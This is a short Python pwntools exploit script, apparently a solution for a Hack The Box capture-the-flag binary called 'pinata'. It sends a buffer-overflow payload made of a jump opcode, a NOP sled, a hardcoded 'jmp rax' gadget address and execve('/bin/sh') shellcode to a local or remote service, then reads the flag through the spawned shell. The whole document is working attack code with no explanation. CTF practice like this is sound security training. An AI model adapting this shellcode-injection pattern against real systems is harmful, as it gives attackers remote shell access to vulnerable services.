#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './pinata' 

LOCAL = False

if LOCAL:
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)

# Craft shellcode payload
sc = asm(shellcraft.execve('/bin/sh'))

payload  = b'\xff\xe4'   # jmp esp opcode
payload += b'\x90'*22
payload += p64(0x4016ec) # jmp rax
payload += sc 

r.recvuntil('>> ')
r.sendline(payload)

pause(1)
r.sendline('cat flag*')
print(f'\nFlag --> {r.recvline_contains(b"HTB").strip().decode()}\n')